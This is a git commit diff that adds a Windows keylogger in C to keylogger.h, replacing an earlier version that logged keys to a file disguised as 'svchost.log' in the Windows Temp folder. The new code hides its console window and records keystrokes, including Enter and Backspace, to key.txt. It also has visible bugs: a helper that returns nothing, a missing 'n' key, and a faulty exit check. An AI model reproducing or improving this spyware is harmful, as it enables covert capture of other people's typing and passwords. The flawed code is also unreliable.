d28c572191a1ba033ecfdf094bea0322125f0585
elit_haxxor <adel.alaali@icloud.com>
2024-07-20 22:31:24 -0700

    added keylogger, forked from armudgal

--- keylogger.h
+++ keylogger.h
@@ -1,41 +1,81 @@
+/*
+Keylogger v1.0
+Author :- Arushit Mudgal */
 
-// Function to log the keys @ C:\\Windows\\Temp\\svchost.log"
-DWORD WINAPI logg() {
+#define _WIN32_WINNT 0x0500
 
-    int vkey, last_key_state[0xFF];
-    int isCAPSLOCK, isNUMLOCK;
-    int isL_SHIFT, isR_SHIFT;
-    int isPressed;
-    char showKey;
-    char NUMCHAR[]=")!@#$%^&*("; // Define the characters to replace numbers
-    char chars_vn[]=";=,-./`"; // Define the characters to replace the numbers
-    char chars_vs[]=":+<_>?~"; // Define the characters to replace the numbers
-    char char_va[]="[]\\'"; // Define the characters to replace the numbers
-    char char_vb[]="{|}\""; // Define the characters to replace the numbers
+#include<stdio.h>
+#include<stdlib.h>
+#include<windows.h>
 
-    FILE *kh; // File pointer for the log file
-    //char KEY_LOG_FILE[]="C:\\Windows\\Temp\\svchost.log"; // Log file to store the key logs
-    char KEY_LOG_FILE2[]="windows.txt"; // Log file to store the key logs
+int G(int a){
+    GetAsyncKeyState(a);
+}
 
-    // Get the state of the last key
-    for (vkey=0; vkey<0xFF; vkey++) {
-        last_key_state[vkey] = GetAsyncKeyState(vkey);
+void logg()
+{
+    HWND hwnd=GetConsoleWindow();
+    //ShowWindow(hwnd,SW_MINIMIZE); //wont hide the window, minimise
+    ShowWindow(hwnd,SW_HIDE);
+
+    FILE *fp;
+    fp = fopen("key.txt","a");
+    if(fp==NULL){
+        puts("Sorry! Cant open file");
+        exit(1);
     }
+    while(1){
 
-    while(1) {
-        Sleep(10);
-        // Get the state of the Capslock key
-        isCAPSLOCK = (GetKeyState(VK_CAPITAL) & 1) == 1 ? 1 : 0;
-        // Get the state of the Numlock key
-        isNUMLOCK = (GetKeyState(VK_NUMLOCK) & 1) == 1 ? 1 : 0;
-        // Get the state of the Shift key
-        isL_SHIFT = GetAsyncKeyState(VK_LSHIFT) >> ((sizeof(SHORT) * 8) - 1);
-        isR_SHIFT = GetAsyncKeyState(VK_RSHIFT) >> ((sizeof(SHORT) * 8) - 1);
+        Sleep(140);
+        //Numbers ranging from 48 - 57
+        if(GetAsyncKeyState(48) || G(96))fputs("0",fp);
+        else if(GetAsyncKeyState(49) || G(97))fputs("1",fp);
+        else if(GetAsyncKeyState(50) || G(98))fputs("2",fp);
+        else if(GetAsyncKeyState(51) || G(99))fputs("3",fp);
+        else if(GetAsyncKeyState(52) || G(100))fputs("4",fp);
+        else if(GetAsyncKeyState(53) || G(101))fputs("5",fp);
+        else if(GetAsyncKeyState(54) || G(102))fputs("6",fp);
+        else if(GetAsyncKeyState(55) || G(103))fputs("7",fp);
+        else if(GetAsyncKeyState(56) || G(104))fputs("8",fp);
+        else if(GetAsyncKeyState(57) || G(105))fputs("9",fp);
+        //Alphabets Uppercase from 65-90
+        else if(GetAsyncKeyState(65))fputs("a",fp);
+        else if(GetAsyncKeyState(66))fputs("b",fp);
+        else if(GetAsyncKeyState(67))fputs("c",fp);
+        else if(GetAsyncKeyState(68))fputs("d",fp);
+        else if(GetAsyncKeyState(69))fputs("e",fp);
+        else if(GetAsyncKeyState(70))fputs("f",fp);
+        else if(GetAsyncKeyState(71))fputs("g",fp);
+        else if(GetAsyncKeyState(72))fputs("h",fp);
+        else if(GetAsyncKeyState(73))fputs("i",fp);
+        else if(GetAsyncKeyState(74))fputs("j",fp);
+        else if(GetAsyncKeyState(75))fputs("k",fp);
+        else if(GetAsyncKeyState(76))fputs("l",fp);
+        else if(GetAsyncKeyState(77))fputs("m",fp);
+        else if(GetAsyncKeyState(79))fputs("o",fp);
+        else if(GetAsyncKeyState(80))fputs("p",fp);
+        else if(GetAsyncKeyState(81))fputs("q",fp);
+        else if(GetAsyncKeyState(82))fputs("r",fp);
+        else if(GetAsyncKeyState(83))fputs("s",fp);
+        else if(GetAsyncKeyState(84))fputs("t",fp);
+        else if(GetAsyncKeyState(85))fputs("u",fp);
+        else if(GetAsyncKeyState(86))fputs("v",fp);
+        else if(GetAsyncKeyState(87))fputs("w",fp);
+        else if(GetAsyncKeyState(88))fputs("x",fp);
+        else if(GetAsyncKeyState(89))fputs("y",fp);
+        else if(GetAsyncKeyState(90))fputs("z",fp);
+        //special characters
+        else if(GetAsyncKeyState(32))fputs(" ",fp); //space
+        else if(GetAsyncKeyState(8))fputs("[BACKSPACE]",fp); //backspace
+        else if(GetAsyncKeyState(13))fputs("[ENTER]",fp); //enter
+        else if(GetAsyncKeyState(16))fputs("[SHIFT]",fp);
+        else if(GetAsyncKeyState(20))fputs("[CAPS]",fp);
 
-        for (vkey=0; vkey<0xFF; vkey++) {
-            isPressed =(GetKeyState(vkey)&0xFF00)>0?1:0;
-            showKey = (char)vkey;
-
+        else if(GetAsyncKeyState(VK_ESCAPE || VK_F1)){
+            fclose(fp);
+            break;
         }
     }
+    fclose(fp);
+
 }
